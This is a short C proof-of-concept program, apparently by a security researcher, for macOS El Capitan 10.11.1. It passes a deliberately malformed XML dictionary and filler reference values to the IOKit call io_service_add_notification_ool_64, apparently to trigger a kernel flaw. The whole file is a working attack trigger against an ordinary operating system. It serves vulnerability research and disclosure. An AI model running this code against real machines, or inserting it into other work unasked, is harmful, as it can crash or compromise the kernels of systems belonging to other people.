// ianbeer

/*
Tested on El Capitan 10.11.1 15b42 on MacBookAir 5,2
*/ 

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>
#include "iokit.h"


int main(int argc, char** argv) {
  kern_return_t err;
  mach_port_t master = MACH_PORT_NULL;
  IOMasterPort(MACH_PORT_NULL, &master);
  printf("master port: %x\n", master);

  char* bad_dict = "<dict><key>a</key><data format=\"hex\">41414141</data>";

  mach_port_t port = MACH_PORT_NULL;

  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

  io_iterator_t i;
  kern_return_t another_error;
  io_user_reference_t ref[8] = {41, 41, 41, 41, 41, 41, 41, 41};
  io_service_add_notification_ool_64(master,
                                     "foo",
                                     bad_dict,
                                     strlen(bad_dict)+1,
                                     port,
                                     ref,
                                     8,
                                     &another_error,
                                     &i);
  return 0;
}
